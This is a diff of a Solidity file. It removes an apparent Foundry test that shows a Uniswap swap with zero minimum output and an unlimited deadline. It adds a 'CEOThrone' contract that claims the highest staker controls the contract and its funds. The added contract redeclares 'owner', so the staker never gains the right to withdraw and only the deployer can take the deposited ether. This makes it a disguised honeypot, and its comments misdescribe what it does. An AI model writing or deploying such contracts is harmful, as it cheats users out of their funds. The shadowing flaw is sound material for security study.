@@ -1,61 +1,39 @@
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.8.18;
+pragma solidity ^0.4.19;
 
-import "forge-std/Test.sol";
-import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
+contract Ownable {
+    address public owner;
 
-interface IUniswapV2Router02 {
-    function swapExactTokensForTokens(
-        uint256 amountIn,
-        uint256 amountOutMin,
-        address[] calldata path,
-        address to,
-        uint256 deadline
-    ) external returns (uint256[] memory amounts);
-}
-
-interface IWETH {
-    function deposit() external payable;
-
-    function approve(address guy, uint256 wad) external returns (bool);
-
-    function withdraw(uint256 wad) external;
-}
-
-contract ContractTest is Test {
-    address UNISWAP_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D; // Uniswap Router address on Ethereum Mainnet
-    IWETH WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
-    address USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
-
-    function setUp() public {
-        vm.createSelectFork("mainnet", 17568400);
+    function Ownable() public {
+        owner = msg.sender;
     }
 
-    function testswapTokensWithMaxDeadline() external payable {
-        WETH.approve(address(UNISWAP_ROUTER), type(uint256).max);
-        WETH.deposit{value: 1 ether}();
+    modifier onlyOwner() {
+        require(msg.sender == owner);
+        _;
+    }
+}
 
-        uint256 amountIn = 1 ether;
-        uint256 amountOutMin = 0;
-        //uint256 amountOutMin = 1867363899; //1867363899 INSUFFICIENT_OUTPUT_AMOUNT
-        // Path for swapping ETH to USDT
-        address[] memory path = new address[](2);
-        path[0] = address(WETH); // WETH (Wrapped Ether)
-        path[1] = USDT; // USDT (Tether)
+//CEO Throne .. The CEO with the highest stake gets the control over the contract
+//msg.value needs to be higher than largestStake when calling Stake()
 
-        // No Effective Expiration Deadline
-        // The function sets the deadline to the maximum uint256 value, which means the transaction can be executed at any time,
-        // possibly under unfavorable market conditions.
-        IUniswapV2Router02(UNISWAP_ROUTER).swapExactTokensForTokens(
-            amountIn,
-            amountOutMin,
-            path,
-            address(this),
-            type(uint256).max // Setting deadline to max value
-        );
+contract CEOThrone is Ownable {
+    address public owner;
+    uint public largestStake;
 
-        console.log("USDT", IERC20(USDT).balanceOf(address(this)));
+    // Stake() function being called with 0xde20bc92 and ETH
+    // The sent ETH is checked against largestStake
+    function Stake() public payable {
+        // if you own the largest stake in a company, you own a company
+        if (msg.value > largestStake) {
+            owner = msg.sender;
+            largestStake = msg.value;
+        }
     }
 
-    receive() external payable {}
+    // withdraw() function being called with 0x3ccfd60b
+    function withdraw() public onlyOwner {
+        // only owner can withdraw funds
+        msg.sender.transfer(this.balance);
+    }
 }
